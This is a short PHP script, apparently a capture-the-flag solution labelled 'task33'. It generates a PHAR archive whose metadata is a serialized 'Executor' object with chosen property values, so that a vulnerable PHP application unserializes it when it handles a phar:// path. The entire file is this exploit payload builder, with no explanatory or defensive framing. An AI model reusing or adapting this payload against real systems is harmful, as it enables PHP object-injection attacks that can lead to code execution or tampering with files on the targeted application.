<?php
class Executor{
    private $filename="task33_part_1.php"; 
    private $signature=true;
    private $init=false;
}
$phar = new Phar('task33.phar');
$phar->startBuffering();
$phar->addFromString('anything.txt', 'text');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new Executor());
$phar->stopBuffering();
?>